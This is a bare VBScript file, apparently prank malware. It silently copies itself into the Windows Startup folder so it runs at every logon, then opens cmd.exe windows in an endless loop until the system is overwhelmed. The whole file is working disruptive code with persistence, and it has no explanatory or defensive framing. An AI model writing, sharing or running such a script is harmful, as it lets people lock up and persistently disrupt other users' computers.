Option Explicit
        Dim objShell
        Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "C:\WINDOWS\system32\cmd.exe"
CreateObject("Shell.Application").Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024
Set objShell = WScript.CreateObject( "WScript.Shell" )
do
objShell.Run "C:\WINDOWS\system32\cmd.exe"
objShell.Run "C:\WINDOWS\system32\cmd.exe"
objShell.Run "C:\WINDOWS\system32\cmd.exe"
loop
Set objShell = Nothing